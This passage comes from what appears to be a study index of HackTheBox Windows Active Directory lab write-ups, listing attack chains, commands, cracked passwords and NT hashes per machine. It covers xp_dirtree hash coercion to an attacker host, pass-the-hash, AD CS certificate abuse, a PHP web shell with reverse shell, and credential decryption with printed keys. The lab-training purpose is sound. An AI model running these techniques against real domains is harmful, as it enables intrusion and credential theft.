- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
- For Shadow Credentials, confirm write access to `msDS-KeyCredentialLink`, add a key credential, obtain a TGT/NT hash with PKINIT, and clean up the added credential afterward.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.

### Post-foothold local enumeration and lateral movement

- Inspect BloodHound Transitive Object Control: p.agila -> Service Account Managers -> GenericAll on Service Accounts.
- Use GenericAll to add p.agila to Service Accounts, which has GenericWrite over ca_svc, winrm_svc, and ldap_svc.
- Abuse GenericWrite with Certipy Shadow Credentials against winrm_svc and ca_svc, preserving/restoring their original key credentials.
- Synchronize time if Kerberos returns KRB_AP_ERR_SKEW, then pass the winrm_svc NT hash to WinRM.

### User path

**Memory chain:** LDAP enumeration → subdomain enumeration → SMB enumeration → group-membership abuse → CVE-2025-24071 → Git history/config → NTLM relay/coercion → password cracking → BloodHound path analysis → ACL abuse

- One of them is CVE-2025-24071, a Windows File Explorer Spoofing Vulnerability, which allows attackers to retrieve the NTLM hash of users upon extracting a ZIP file with a crafted .library-ms file, as explained here.
- Since we have a writable SMB share, let's try to exploit this vulnerability.
- The p.agila user is a part of the service account managers group, which has the GenericAll ACL over the service accounts group.
- Enumerating the service accounts further (following the above method to view the Transitive Object Control ) reveals that this group has GenericWrite over not only ca_svc but two other accounts, winrm_svc and ldap_svc .
- First, the GenericAll ACL should be used to add ourselves ( p.agila ) to the service accounts group.

#### Commands and PDF search strings

- `nmap 10.10.11.69 -p $ports -sV -sC`
- `crackmapexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares`
- `sudo responder -I tun0`
- `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`
- `bloodhound-python -d fluffy.htb`
- `Certipy v4.8.2 - by Oliver Lyak (ly4k)`
- `evil-winrm to get an interactive shell.`
- `evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb`

### Artifacts and exact search anchors

`DC01.fluffy.htb`, `fluffy.htb`, `/etc/hosts`, `CVE-2025-24071`, `poc.py`, `exploit.zip`, `/usr/share/wordlists/rockyou.txt`, `C:\Users\winrm_svc\Documents`, `C:\Users\winrm_svc\Desktop\user.txt`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Confirm AD CS with the LDAP ADCS module and enumerate enabled/vulnerable CA configuration using ca_svc's hash.
- Recognize ESC16: the CA globally omits the SID security extension even though no template is independently vulnerable.
- Temporarily change ca_svc's UPN to administrator, request the default User template as ca_svc, then restore the original UPN.
- Authenticate with the Administrator PFX to recover the Administrator NT hash and use it for privileged access.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.

### Root / Administrator path

**Memory chain:** AD CS/certificate abuse → SMB enumeration → LDAP enumeration → PFX/certificate-key recovery → private-key discovery → Kerberos ticket abuse → WinRM

- It should be found that the Active Directory Certificate Service( ADCS ) is running in the target.
- Certificate Templates : [!] Could not find any certificate templates The output from the certipy tool should be analyzed to identify that this installation is vulnerable to the ESC16 attack.
- Since the ca_sv c user's UPN has been updated to administrator , the resulting certificate will allow us to authenticate as the administrator user.

#### Commands and PDF search strings

- `crackmapexec ldap 10.10.11.69 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs`
- `evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb`

### Artifacts and exact search anchors

`fluffy.htb`, `DC01.fluffy.htb`, `administrator.pfx`, `C:\Users\Administrator\Documents`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **10** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 31- Eighteen

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/Eighteen.md) · [Official PDF](./htb-writeups/Eighteen.pdf)

### Machine path overview

Eighteen is an easy difficulty Windows machine that demonstrates common weaknesses in database access control and Active Directory misconfigurations. Initial access is obtained by identifying valid MSSQL credentials and abusing impersonation privileges to access backend application data. Extracted password hashes are cracked offline and used for password spraying, leading to WinRM access as a domain user. Privilege escalation is achieved by abusing delegated permissions in Active Directory. Specifically, membership in a group with CreateChild rights over an Organisational Unit allows exploitation of the BadSuccessor technique to create a delegated Managed Service Account (dMSA) linked to the Administrator account, ultimately leading to full domain compromise.

### Remote enumeration and foothold checks

- Treat the supplied kevin credential as a SQL-local login and use MSSQL --local-auth; domain authentication is the wrong mode.
- When xp_cmdshell is denied, enumerate sys.server_principals and IMPERSONATE grants instead of abandoning MSSQL.
- EXECUTE AS LOGIN appdev, enumerate databases/tables, and extract the PBKDF2-SHA256 hash from financial_planner.dbo.users.
- Convert the Werkzeug-style PBKDF2 fields into Hashcat mode 10900 format before cracking.
- Use NetExec MSSQL --local-auth --rid-brute to enumerate domain users, then spray the cracked password against WinRM to identify adam.scott.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Check whether MSSQL `xp_cmdshell` is enabled or can be enabled by the current role; distinguish database-level access from OS command execution.
- Enumerate MSSQL `IMPERSONATE` permissions and test `EXECUTE AS LOGIN/USER`; re-check effective server roles after impersonation.
- Use MSSQL-assisted RID brute forcing when the available login is a SQL-local account. Remember `--local-auth`; a domain-auth attempt can fail even when the SQL credential is valid.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.

### Post-foothold local enumeration and lateral movement

- Collect BloodHound data and confirm adam.scott -> IT group -> CreateChild over OU=Staff.
- Verify the OU ACL directly with PowerView Get-ObjectAcl and resolve the SID rather than relying only on the graph.
- Because LDAP is not externally reachable, create a reverse SOCKS tunnel with chisel and run the NetExec badsuccessor module through proxychains.
- Create a Logon Type 9 process with Invoke-RunasCs before relying on in-memory Kerberos ticket operations.

### User path

**Memory chain:** database enumeration → WinRM → group-membership abuse → password cracking → password spraying

- switch to this database and enumerate its tables.
- The extracted hash is not directly compatible with common cracking tools like hashcat .
- While it contains all the required components, such as the algorithm, iteration count, salt, and hash, they are not arranged in the format expected by hashcat .
- This involves extracting the iteration count, encoding the salt in base64 , converting the hash from hexadecimal to raw bytes, and then encoding it in base64 .
- Although we now have a valid password, we still need to determine which domain user it belongs to.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.129.24.159`
- `nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth`
- `hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt`
- `nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute`
- `nxc winrm dc01.eighteen.htb -u ./users -p 'iloveyou1' --continue-on-success`
- `evil-winrm -i dc01.eighteen.htb -u adam.scott -p 'iloveyou1'`
- `Evil-WinRM shell v3.9`

### Artifacts and exact search anchors

`conevrsor.htb`, `eighteen.htb`, `DC01.eighteen.htb`, `/etc/hosts`, `mssqlclient.py`, `xp_cmdshell`, `execute as`, `hash_convert.py`, `/usr/share/wordlists/rockyou.txt`, `C:\Users\adam.scott\Documents`, `C:\Users\adam.scott\Desktop\user.txt`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Derive adam.scott's AES256 Kerberos key with Rubeus and inject a TGT into the Logon Type 9 session.
- Use SharpSuccessor to create a dMSA in the Staff OU and link it to Administrator via the BadSuccessor attributes.
- Use Rubeus tgtdeleg, then request/inject a dMSA TGS for the new account to inherit Administrator-equivalent access.
- Verify the resulting ticket by reading the Administrator share/root file over CIFS.
- SharpSuccessor/BadSuccessor may print an error after creating the weaponized dMSA; verify the logs/directory object and continue when creation succeeded instead of treating every terminal error as fatal.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.

### Root / Administrator path

**Memory chain:** BloodHound path analysis → WinRM → ACL abuse → Kerberos ticket abuse → SMB enumeration → LDAP enumeration → saved-credential abuse → reverse shell

- Since adam.scott is a member of this group, he inherits this permission, effectively granting him CreateChild access over the Staff OU .
- Before performing Kerberos-based attacks, we need a session with Logon Type 9 , which allows proper ticket handling.
- This command abuses Kerberos delegation to obtain a usable ticket that can later be leveraged to request service tickets on behalf of other users.
- This allows us to access resources as the Administrator .
- PS C:\programdata> ls \\dc01\c$\users\Administrator\Desktop\root.txt Directory: \\dc01\c$\users\Administrator\Desktop Mode ----ar--- LastWriteTime Length Name ------------- ------ ---- 4/9/2026 7:21 AM 34 root.txt We can now retrieve the root flag. $ type \\dc01\c$\users\Administrator\Desktop\root.txt

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`C:\programdata`, `eighteen.htb`, `PowerView.ps1`, `DC01.eighteen.htb`, `Invoke-RunasCS.ps1`, `C:\WINDOWS\system32`, `kavi_dmsa.eighteen.htb`

Open the PDF around page **10** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 32- Escape

**Target:** Windows / Active Directory · Medium

[Detailed notes](./htb-writeups/Escape.md) · [Official PDF](./htb-writeups/Escape.pdf)

### Machine path overview

Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user ryan.cooper . Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.

### Remote enumeration and foothold checks

- Try SMB guest access and download the sensitive PDF; extract the temporary MSSQL credential from document contents.
- Start Responder, connect to MSSQL, and invoke xp_dirtree against an attacker UNC path to coerce the SQL service account's NTLM authentication.
- Crack the sql_svc NetNTLMv2 hash and use its plaintext password over WinRM.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Abuse MSSQL `xp_dirtree` for filesystem discovery or forced SMB authentication. Check web roots, backups, configuration files, and UNC paths; it often works without `xp_cmdshell`.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Post-foothold local enumeration and lateral movement

- Enumerate C:\sqlserver\Logs and read ERRORLOG.bak; it records Ryan.Cooper's failed login with a plaintext password.
- Test the rejected MSSQL password as Ryan.Cooper on WinRM because users commonly reuse passwords across services.
- Revisit Nmap's certificate-related output and enumerate the installed CA/templates with Certify.
- The writeup's Certify tooling has no ready release executable; build Certify in Visual Studio before uploading/running it to enumerate the CA and ESC1 template.

### User path

**Memory chain:** database enumeration → SMB enumeration → NTLM relay/coercion → password cracking → WinRM

- What we could attempt, however, is to force the SQL service to authenticate to our machine and capture the hash.
- If the SQL service is running as a user account, there is a high chance that the captured hash will be crackable.
- So, let's copy the captured hash to a file called hash and attempt to crack it using john . john --wordlist=/usr/share/wordlists/rockyou.txt hash The hash cracked successfully and we have the clear text password REGGIE1234ronnie for the user sql_svc .
- Performing some more enumeration on the machine, we locate a log file for the MSSQL service. type C:\sqlserver\Logs\ERRORLOG.bak It seems like the user ryan.cooper tried to authenticate to the service with the password of NuclearMosquito3 , but his credentials got rejected.
- With this in mind let's try to authenticate as ryan.cooper over WinRM using this password. evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3 We have a shell as the user ryan.cooper and the user flag can be found in C:\Users\Ryan.Cooper\Desktop\user.txt .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.202`
- `smbclient -L \\\\sequel.htb\\`
- `smbclient \\\\sequel.htb\\public`
- `impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb`
- `EXEC MASTER.sys.xp_dirtree '\\10.10.14.14\test', 1, 1`
- `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
- `evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie`
- `evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3`

### Artifacts and exact search anchors

`sequel.htb`, `dc.sequel.htb`, `/etc/hosts`, `xp_dirtree`, `/usr/share/wordlists/rockyou.txt`, `C:\users`, `C:\sqlserver\Logs\ERRORLOG.bak`, `ERRORLOG.bak`, `C:\Users\Ryan.Cooper\Desktop\user.txt`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Identify the UserAuthentication template as ESC1: Authenticated Users can enroll and supply an arbitrary subject/UPN.
- Request a certificate for administrator@sequel.htb with Ryan.Cooper's credential, synchronize time, and authenticate with the PFX.
- Pass the recovered Administrator NT hash to WinRM.
- Alternate reminder: sql_svc can forge a silver ticket for MSSQL locally; derive the domain SID/NT hash, use ticketer with an arbitrary SPN, then read files with OPENROWSET.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.

### Root / Administrator path

**Memory chain:** WinRM → AD CS/certificate abuse → PFX/certificate-key recovery → pass-the-hash → database enumeration → Kerberos ticket abuse

- Now that we have a certificate for the administrator we can use certipy once more to get a Ticket Granting Ticket (TGT) and extract the NT hash for this user.
- Following the logic of a Silver Ticket attack we could be able to forge a ticket in behalf of the user Administrator to access the MSSQL service.
- Unfortunately, there is no Service Principal Name (SPN) set for this service instance so Kerberos isn't able to produce a valid Service Ticket for us that we could then try and alter.
- So, even if Kerberos is unaware that MSSQL is running under sql_svc if we manage to craft a valid ticket locally for the Administrator user we should be able to access the service as this user.
- Now, we export our ticket and authenticate to the service using Kerberos authentication. export KRB5CCNAME=Administrator.ccache impacket-mssqlclient -k dc.sequel.htb Now, we can use the following queries to read the user.txt as well as the root.txt .

#### Commands and PDF search strings

- `certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb`
- `sudo ntpdate -u dc.sequel.htb`
- `certipy auth -pfx administrator.pfx`
- `evil-winrm -i sequel.htb -u administrator -H a52f78e<SNIP>58f4ee`
- `evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie`
- `impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF`
- `impacket-mssqlclient -k dc.sequel.htb`
- `SELECT * FROM OPENROWSET(BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB) AS`
- `SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB)`

### Artifacts and exact search anchors

`sequel.htb`, `dc.sequel.htb`, `administrator.pfx`, `C:\Users\Administrator\Desktop\root.txt`, `C:\users\ryan.cooper\desktop\user.txt`

Open the PDF around page **7** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 33- Monteverde

**Target:** Windows / Active Directory · Medium

[Detailed notes](./htb-writeups/Monteverde.md) · [Official PDF](./htb-writeups/Monteverde.pdf)

### Machine path overview

Monteverde is a Medium Windows machine that features Azure AD Connect. The domain is enumerated and a user list is created. Through password spraying, the SABatchJobs service account is found to have the username as a password. Using this service account, it is possible to enumerate SMB Shares on the system, and the $users share is found to be world-readable. An XML file used for an Azure AD account is found within a user folder and contains a password. Due to password reuse, we can connect to the domain controller as mhope using WinRM. Enumeration shows that Azure AD Connect is installed. It is possible to extract the credentials for the account that replicates the directory changes to Azure (in this case the default domain administrator).

### Remote enumeration and foothold checks

- Test LDAP anonymous bind and query RootDSE/defaultNamingContext, then enumerate users and admin objects with windapsearch.
- Also test SMB null independently; a successful anonymous login can still fail to list shares and is not proof that authenticated SMB is useless.
- Notice AAD_* and SABatchJobs account names as evidence of Azure AD Connect/service-account usage.
- Enumerate Remote Management Users anonymously and note mhope is eligible for PowerShell remoting.
- Check the domain lockout policy before spraying; with no threshold, build a user list and include usernames in the candidate password list.
- Try LDAP with an anonymous simple bind (`ldapsearch -x` / blank user). Request the naming contexts first, then query the discovered base DN for users, groups, descriptions, and memberships.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- Run `windapsearch` with a blank identity; test user enumeration and privileged/remote-management group membership even if the first anonymous query returns little data.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.

### Post-foothold local enumeration and lateral movement

- Password spraying reveals SABatchJobs uses its username as password; re-enumerate SMB shares with that identity.
- Browse the world-readable users$ share and retrieve mhope's azure.xml file; test the embedded password as mhope over WinRM.
- Enumerate installed programs and notice Microsoft Azure AD Sync/Connect components.
- Check netstat and SQL installation details: the AD Sync SQL instance is locally bound even though it is not externally exposed.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → Git history/config → WMI/PowerShell remoting → password spraying → WinRM

- This group allows its members to connect to computers using PowerShell Remoting. python windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users" The user mhope is identified to be in the Remote Management Users group.
- can attempt to get credentials and access it again.
- check if mhope also uses this password in the local AD.
- can use WinRM to test the credentials, as we know this account is in the Remote Management Users group. evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$' This is successful, although the command whoami /priv reveals that the current user is not privileged.
- However, whoami /groups reveals that this account is a member of the group MEGABANK\Azure Admins .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.10.172`
- `wget https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py`
- `python windapsearch.py -u "" --dc-ip 10.10.10.172`
- `python windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects`
- `python windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"`
- `enum4linux -a 10.10.10.172`
- `python windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut`
- `wget https://raw.githubusercontent.com/insidetrust/statistically-likelyusernames/master/weak-corporate-passwords/english-basic.txt`
- `crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt`
- `smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -x whoami`
- `smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A`
- `evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`

### Artifacts and exact search anchors

`windapsearch.py`, `azure.xml`, `10.10.10.172-users_mhope_azure.xml`, `C:\Users\mhope\Desktop`

Open the PDF around page **8** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use sqlcmd locally against the AD Sync database rather than assuming the default LocalDB named pipe setup.
- Extract instance_id, keyset_id, and entropy from the ADSync database and feed them to the AD Connect credential-decryption PowerShell logic.
- Recover the directory-synchronization account credential, which is the domain Administrator in this lab, and use it for privileged access.

### Root / Administrator path

**Memory chain:** WinRM → service abuse → registry secrets → DPAPI/browser secrets → database enumeration → writable script/file abuse

- can also try to enumerate services with the PowerShell cmdlet Get-Service , or by invoking wmic.exe service get name , sc.exe query state= all or net.exe start , but are also denied access.
- Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force Searching online reveals the adconnectdump tool, that can be used to extract the password for the AD Connect Sync Account.
- Modify the script to set the $key_id , $instance_id and $entropy variables to the values we extracted from the database, and remove the commands that try to obtain them automatically.
- It's worth noting that a default installation uses the NT SERVICE\ADSync service account.
- use Evil WinRM to connect as the administrator. evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!' The root flag is located in C:\Users\Administrator\Desktop .

#### Commands and PDF search strings

- `evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .`
- `Get-ADConnectPassword`
- `evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'`

### Artifacts and exact search anchors

`C:\Program Files\ we can see that both Microsoft SQL Server and AD Connect are`, `C:\Program Files`, `M:\SYSTEM\CurrentControlSet\Services\ADSync`, `C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe`, `C:\Program`, `adconnect.ps1`, `C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll`, `mcrypt.dll`, `C:\Users\Administrator\Desktop`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 34- Cascade

**Target:** Windows / Active Directory · Medium

[Detailed notes](./htb-writeups/Cascade.md) · [Official PDF](./htb-writeups/Cascade.pdf)

### Machine path overview

Cascade is a medium diﬃculty Windows machine conﬁgured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user r.thompson , which gives access to a TightVNC registry backup. The backup is decrypted to gain the password for s.smith . This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the ArkSvc account. This account belongs to the AD Recycle Bin group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.

### Remote enumeration and foothold checks

- Test anonymous SMB and LDAP separately; anonymous SMB cannot list shares, while LDAP user/property enumeration works.
- Request full LDAP attributes, not only names/descriptions; r.thompson has a nonstandard cascadeLegacyPwd value that Base64-decodes to a password.
- When r.thompson cannot WinRM, re-enumerate authenticated SMB permissions and inspect the Data share's IT subfolders.
- Read Meeting_Notes_June_2018.html for the TempAdmin/Administrator password-reuse clue, ArkAdRecycleBin.log for the deleted object and ArkSvc context, and s.smith's VNC Install.reg backup.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Run `windapsearch` with a blank identity; test user enumeration and privileged/remote-management group membership even if the first anonymous query returns little data.
- Read AD user descriptions and notes; administrators often leave onboarding/default passwords or operational clues there.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.

### Post-foothold local enumeration and lateral movement

- Decrypt TightVNC's registry Password field with its known fixed DES key, then use s.smith over WinRM.
- Inspect s.smith's AD properties and assigned logon script; NETLOGON MapAuditDrive.vbs reveals the otherwise hidden Audit$ share.
- Download RunAudit.bat, Audit.db, CascAudit.exe, and CascCrypto.dll from Audit$.
- Inspect the SQLite LDAP table and decompile both .NET assemblies to recover the AES key, IV, CBC mode, and ArkSvc password.
- Use ArkSvc over WinRM and verify membership in AD Recycle Bin.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → WinRM → Git history/config → WMI/PowerShell remoting → credential reuse → registry secrets

- Username is TempAdmin (password is the same as the normal admin account password). </SNIP> The email exchange hints to the existence of a TempAdmin account, that has the same password as the default Administrator account.
- Foothold TightVNC The registry ﬁle found contains a Password attribute, with the corresponding value consisting of hexadecimal characters. "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f This writeup demonstrates how TightVNC passwords can be decrypted using Metasploit.
- Use the commands below to decrypt the password. msfconsole msf5 > irb key="\x17\x52\x6b\x06\x23\x4e\x58\x07" require 'rex/proto/rfb' Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key The key variable is the known hardcoded DES key that has been extracted from the program.
- The Rex::Proto::RFB::Cipher.decrypt function is used to decrypt the password with the provided key.
- The following script can be used to decrypt the password. import pyaes from base64 import b64decode key = b"c4scadek3y654321" iv = b"1tdyjCbY1Ix49842" aes = pyaes.AESModeOfOperationCBC(key, iv = iv) decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')) print(decrypted.decode()) The decryption is successful, revealing the password for the ArcSvc account to be w3lc0meFr31nd .

#### Commands and PDF search strings

- `nmap -p$ports -Pn -sC -sV 10.10.10.182`
- `smbclient -L 10.10.10.182`
- `./windapsearch.py -U --full --dc-ip 10.10.10.182`
- `evil-winrm -i 10.10.10.182 -u r.thompson -p rY4n5eva`
- `smbmap -H 10.10.10.182 -u r.thompson -p 'rY4n5eva'`
- `smbclient \\\\10.10.10.182\\Data -U r.thompson`
- `evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2`
- `Get-ADUser -identity s.smith -properties *`
- `smbclient \\\\10.10.10.182\\NETLOGON -U s.smith`
- `smbclient \\\\10.10.10.182\\Audit$ -U s.smith`
- `sudo apt install wine64 -y`
- `evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd`

### Artifacts and exact search anchors

`windapsearch.py`, `C:\Users\s.smith\Desktop`, `RunAudit.bat`, `Audit.db`, `dnSpy-netcore-win64.zip`, `CascCrypto.dll`, `aes.Key`

Open the PDF around page **8** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Query deleted user objects with Get-ADObject -IncludeDeletedObjects and filter for TempAdmin.
- Request all TempAdmin properties and decode cascadeLegacyPwd.
- Apply the earlier email clue: TempAdmin reused the normal Administrator password; log in as Administrator with the decoded value.

### Root / Administrator path

**Memory chain:** group-membership abuse → credential reuse → WinRM

- The Active Directory Recycle Bin is used to recover deleted Active Directory objects such as Users, Groups, OUs etc.
- The objects keep all their properties intact while in the AD Recycle Bin, which allows them to be restored at any point.
- The returned string looks like a password but the user is deleted, so we cannot use it to log in as TempAdmin .
- However, we recall the email correspondence mentioned that the Administrator account has the same password as the TempAdmin account.
- login as the Administrator instead. evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles The login was successful and the root ﬂag can be read.

#### Commands and PDF search strings

- `whoami /all`
- `Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects`
- `Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" IncludeDeletedObjects`
- `select only that speciﬁc account.`
- `Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)`
- `evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles`

### Artifacts and exact search anchors

No stable artifact was extracted automatically; use the decision checks and commands.

Open the PDF around page **16** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 35- TheFrizz

**Target:** Windows / Active Directory · Medium

[Detailed notes](./htb-writeups/TheFrizz.md) · [Official PDF](./htb-writeups/TheFrizz.pdf)

### Machine path overview

TheFrizz is a medium-difficulty Windows machine featuring a web application showcasing Walkerville Elementary School and a Gibbon CMS instance. The Gibbon-LMS instance is susceptible to unauthenticated arbitrary file write (CVE-2023-45878), which is used to write a PHP shell to the web application and gain access to the target. After gaining access to the system, a database settings file containing credentials to access MySQL includes a hash and salt for the user f.frizzle that can be cracked. After cracking the password, we authenticate to the target using SSH with GSSAPI/Kerberos. We request a TGT, which is then used to authenticate via Kerberos authentication. A deleted 7Zip archive is discovered in the fiona user's recycling bin which is extracted revealing a WAPT setup and includes a configuration file with base64encoded credentials used to authenticate as the M.Schoolbus user. M.Schoolbus is a member of the Group Policy Creator Owners , which allows them to create GPOs within the domain, which is leveraged to escalate privileges to NT Authority\System .

### Remote enumeration and foothold checks

- Follow the HTTP redirect/domain name and identify Gibbon-LMS v25.0.0 from the footer.
- Exploit CVE-2023-45878 unauthenticated arbitrary file write to place/execute a PHP command shell and obtain a w.webservice callback.
- Read C:\xampp\htdocs\Gibbon-LMS\config.php for the localhost MySQL database credential.
- Use XAMPP's local mysql.exe to query gibbonperson, recover f.frizzle's salted password hash, and crack it offline.
- Configure Kerberos/DNS/time, request f.frizzle's TGT, and use SSH with GSSAPI (-K), not password SSH.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.

### Post-foothold local enumeration and lateral movement

- Enumerate C:\$Recycle.Bin under f.frizzle's SID and use the Shell.Application recycle-bin namespace to recover the deleted wapt-backup-sunday.7z with its original name.
- Transfer the large archive with SCP over the existing Kerberos SSH session, extract it, and grep the WAPT tree for password settings.
- Base64-decode the WAPT password and consider the reversed string clue when choosing M.SchoolBus.
- Request M.SchoolBus's TGT and use Kerberos SSH; whoami /groups shows Group Policy Creator Owners.

### User path

**Memory chain:** CVE-2023-45878 → database enumeration → SSH → configuration-file secrets → group-membership abuse → web shell/RCE → Git history/config → reverse shell → password cracking → Kerberos ticket abuse

- The Gibbon-LMS instance is susceptible to unauthenticated arbitrary file write (CVE-2023-45878), which is used to write a PHP shell to the web application and gain access to the target.
- After gaining access to the system, a database settings file containing credentials to access MySQL includes a hash and salt for the user f.frizzle that can be cracked.
- M.Schoolbus is a member of the Group Policy Creator Owners , which allows them to create GPOs within the domain, which is leveraged to escalate privileges to NT Authority\System .
- After checking our listener, we notice we obtained a reverse shell. $ nc -lvvp 4444 listening on [any] 4444 ... connect to [10.10.14.89] from frizzdc.frizz.htb [10.129.18.72] 59191 PS C:\xampp\htdocs\Gibbon-LMS> Enumerating the contents of the web server, we find the config.php inside the Gibbon-LMS directory.
- To obtain a valid Kerberos ticket, we first need to sync our time with the target, then generate an NTLM hash using the known password to pass into Impacket 's getTGT.py script.

#### Commands and PDF search strings

- `nmap -p- --min-rate=1000 -sC -sV 10.129.18.72`
- `SSH on port 22 and Kerberos on port 88 . Let's add frizzdc.frizz.htb to our /etc/hosts file and begin`
- `ssh f.frizzle@frizzdc.frizz.htb`
